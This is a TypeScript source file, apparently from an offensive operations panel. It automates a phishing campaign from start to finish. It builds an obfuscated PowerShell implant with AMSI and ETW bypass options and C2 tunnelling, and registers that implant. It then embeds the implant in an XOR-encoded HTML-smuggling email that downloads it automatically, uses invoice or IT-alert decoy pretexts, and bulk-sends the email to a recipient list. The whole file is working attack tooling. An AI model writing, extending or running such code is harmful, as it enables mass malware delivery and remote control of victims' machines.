import { randomBytes } from "node:crypto"
import { readFile, unlink } from "node:fs/promises"
import { getPresetById } from "./presets"
import { emitLog, emitDone, type ExecResult } from "./run-registry"
import type { PayloadConfig } from "@/lib/payloads/generator"

function randHex(n: number) {
  return randomBytes(n).toString("hex")
}

function parsePort(listenAddr: string, fallback = 443): number {
  const parts = listenAddr.split(":")
  const p = parseInt(parts[parts.length - 1], 10)
  return isNaN(p) ? fallback : p
}

function obfLevelToName(level: 0 | 1 | 2 | 3): "light" | "medium" | "heavy" {
  if (level <= 1) return "light"
  if (level === 2) return "medium"
  return "heavy"
}

export interface OperationRunParams {
  runId: string
  nodeId: string
  presetId: string
  emailCsv: string
  smtpConfigId?: string
  overrides?: {
    subject?: string
    xorKey?: number
    obfuscationLevel?: 0 | 1 | 2 | 3
    pretextArgs?: Record<string, string>
    customPretextHtml?: string
  }
}

export async function runOperation(params: OperationRunParams): Promise<void> {
  const { runId, nodeId, presetId, emailCsv, smtpConfigId, overrides } = params

  const log = (msg: string, level: "info" | "ok" | "err" = "info") =>
    emitLog(runId, level, msg)

  try {
    const preset = getPresetById(presetId)
    if (!preset) throw new Error(`Unknown preset: ${presetId}`)

    /* ---- Resolve node ---- */
    const { getNodeById } = await import("@/lib/db/nodes")
    const node = await getNodeById(nodeId)
    if (!node) throw new Error(`Node not found: ${nodeId}`)
    const nodePort = parsePort(node.listenAddr, preset.profile.port)
    log(`Node resolved: ${node.name} (${node.hostname}:${nodePort})`, "ok")

    /* ---- Step 1: Create profile ---- */
    log("Creating Hysteria2 profile…")
    const obfsPassword = preset.profile.obfsEnabled ? randHex(preset.profile.obfsPasswordLength / 2) : undefined
    const profileName = preset.profile.nameTemplate.replace("{ts}", Date.now().toString(36))

    const { createProfile } = await import("@/lib/db/profiles")
    const profile = await createProfile({
      name: profileName,
      type: "basic_tls_proxy",
      description: `Auto-created by Quick Op: ${preset.name}`,
      nodeIds: [node.id],
      config: {
        port: preset.profile.port,
        obfsType: preset.profile.obfsEnabled ? "salamander" : "none",
        ...(obfsPassword ? { obfsPassword } : {}),
        masqueradeUrl: preset.profile.masqueradeUrl,
        tlsMode: "self-signed",
      },
    })
    log(`Profile created: ${profile.id}`, "ok")

    /* ---- Step 2: Create payload record ---- */
    log("Creating payload record…")
    const obfLevel = overrides?.obfuscationLevel ?? preset.payload.obfuscationLevel
    const techniques: Array<"amsi_bypass" | "etw_bypass" | "string_encode"> = []
    if (preset.payload.amsiBypass) techniques.push("amsi_bypass")
    if (preset.payload.etwBypass) techniques.push("etw_bypass")
    if (preset.payload.stringEncode) techniques.push("string_encode")

    const hysteriaServer = `${node.hostname}:${preset.profile.port}`
    const authPassword = obfsPassword ?? randHex(12)

    const payloadConfig: PayloadConfig = {
      name: preset.payload.nameTemplate.replace("{ts}", Date.now().toString(36)),
      type: "powershell" as const,
      platform: "windows" as const,
      hysteriaConfig: {
        server: hysteriaServer,
        auth: authPassword,
        insecure: true,
        tunEnabled: false,
        obfsType: (preset.profile.obfsEnabled ? "salamander" : "none") as "none" | "salamander",
        obfsPassword: obfsPassword ?? "",
        masquerade: preset.profile.masqueradeUrl,
      },
      obfuscation: {
        enabled: obfLevel > 0,
        level: obfLevelToName(obfLevel),
        techniques,
      },
      features: { autoReconnect: true, heartbeat: 30, fallbackServers: [] as string[] },
      signing: { enabled: false },
      packing: { enabled: false, method: "none" as const, compressionLevel: 6 },
      camouflage: { enabled: false, binaryName: "svchost.exe" },
      persistence: { enabled: false, method: "none" as const, serviceName: "WindowsUpdate", serviceDescription: "" },
      deadManSwitch: { enabled: false, checkInTimeoutHours: 72 },
      cdnFront: { enabled: false, frontDomain: "", realHost: "" },
      sliverC2: { enabled: false, listenerUrl: "", localSocksPort: 10080 },
      deployment: { windowsGui: false, generateDocker: false, generateK8s: false },
    }

    const payloadName = payloadConfig.name

    const { createPayloadBuild, getPayloadBuildById, updatePayloadBuildStatus } = await import("@/lib/db/payload-builds")
    const build = await createPayloadBuild({
      name: payloadName,
      type: "powershell",
      platform: "windows",
      description: `Quick Op: ${preset.name}`,
      config: payloadConfig,
      obfuscationLevel: obfLevel,
      packingMethod: "none",
    })
    log(`Payload record created: ${build.id}`, "ok")

    /* ---- Step 3: Trigger build ---- */
    log("Building payload…")
    await updatePayloadBuildStatus(build.id, "building", "Starting build…")
    const { buildPowerShell } = await import("@/lib/payloads/builders/powershell")
    await Promise.race([
      buildPowerShell(build.id, payloadConfig),
      new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error("Payload build timed out after 90s")), 90_000)),
    ])
    await updatePayloadBuildStatus(build.id, "ready", "Build completed")
    log("Payload built", "ok")

    /* ---- Step 4: Verify and read file ---- */
    const builtRecord = await getPayloadBuildById(build.id)
    if (!builtRecord?.implantBinaryPath) throw new Error("Build succeeded but no binary path found")
    log(`Payload ready: ${(builtRecord.sizeBytes ?? 0) / 1024 | 0} KB`, "ok")

    let fileBuffer: Buffer
    try {
      fileBuffer = await readFile(builtRecord.implantBinaryPath)
    } catch {
      throw new Error("Payload file missing from disk — build may have failed silently")
    }
    const payloadB64 = fileBuffer.toString("base64")
    // Best-effort cleanup — don't let tmp files accumulate
    unlink(builtRecord.implantBinaryPath).catch(() => {})

    /* ---- Step 5: Register implant ---- */
    log("Registering implant…")
    const { createImplant } = await import("@/lib/db/implants")
    const implant = await createImplant({
      name: `implant-${payloadName}`,
      type: "powershell",
      architecture: "x64",
      nodeId: node.id,
      config: { payloadId: build.id, platform: "windows", profileId: profile.id },
      transportConfig: { server: node.hostname, port: preset.profile.port },
    })
    log(`Implant registered: ${implant.implantId}`, "ok")

    /* ---- Step 6: Generate smuggled HTML ---- */
    log("Generating HTML-smuggled email…")
    const xorKey = overrides?.xorKey ?? preset.campaign.xorKey
    const { generateSmuggleEmail, PRETEXT_TEMPLATES } = await import("@/lib/mailer/html-smuggler")

    function renderPretext(id: "invoice" | "hr_policy" | "it_alert" | "contract", args: Record<string, string>): string {
      switch (id) {
        case "invoice":  return PRETEXT_TEMPLATES.invoice(args.companyName ?? "Acme Corp", args.invoiceNum ?? "INV-001")
        case "hr_policy": return PRETEXT_TEMPLATES.hr_policy(args.companyName ?? "Acme Corp")
        case "it_alert": return PRETEXT_TEMPLATES.it_alert()
        case "contract": return PRETEXT_TEMPLATES.contract(args.counterparty ?? "Partner Ltd")
        default: {
          const _: never = id
          throw new Error(`Unknown pretext template: ${id as string}`)
        }
      }
    }

    const mergedPretextArgs = { ...preset.campaign.pretextArgs, ...(overrides?.pretextArgs ?? {}) }
    const decoyHtml = overrides?.customPretextHtml ?? renderPretext(preset.campaign.pretext, mergedPretextArgs)
    const smugHtml = generateSmuggleEmail({
      payloadBase64: payloadB64,
      filename: "document.ps1",
      decoyHtml,
      xorKey,
      autoDownload: true,
    })
    log(`Smuggled HTML generated: ${(Buffer.byteLength(smugHtml, "utf8") / 1024).toFixed(1)} KB`, "ok")

    /* ---- Step 7: Parse email list and send ---- */
    const { parseEmailCSV, sanitizeRecipients, sendBulkEmails } = await import("@/lib/mailer/bulk-email")
    const { resolveSmtpConfig } = await import("@/lib/mailer/smtp-config")

    const recipients = parseEmailCSV(emailCsv)
    const { valid, invalid } = sanitizeRecipients(recipients)
    log(`Email list parsed: ${valid.length} valid, ${invalid.length} invalid`)

    if (valid.length === 0) throw new Error("No valid email addresses in list")

    const smtpConfig = await resolveSmtpConfig(smtpConfigId)
    if (!smtpConfig) throw new Error("No SMTP configuration found — add one in Mail Ops → SMTP Configs")

    const subject = overrides?.subject ?? preset.campaign.subject.replace("{ts}", Date.now().toString(36))

    log(`Sending to ${valid.length} recipients…`)
    const sendResult = await Promise.race([
      sendBulkEmails(valid, {
        subject,
        body: "Please see attached document.",
        htmlBody: smugHtml,
        provider: "mysmtp",
        smtpConfig,
        rateLimitPerMinute: preset.campaign.rateLimitPerMinute,
        batchSize: preset.campaign.batchSize,
        delayMs: preset.campaign.delayMs,
      }),
      new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error("Email send timed out after 90s")), 90_000)),
    ])

    log(`Sent: ${sendResult.sent} · Failed: ${sendResult.failed}`, sendResult.failed === 0 ? "ok" : "err")

    const result: ExecResult = {
      profileId: profile.id,
      payloadId: build.id,
      implantId: implant.implantId,
      sentCount: sendResult.sent,
      failedCount: sendResult.failed,
    }

    emitDone(runId, result)
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err)
    emitLog(runId, "err", `ERROR: ${msg}`)
    emitDone(runId, undefined, msg)
  }
}
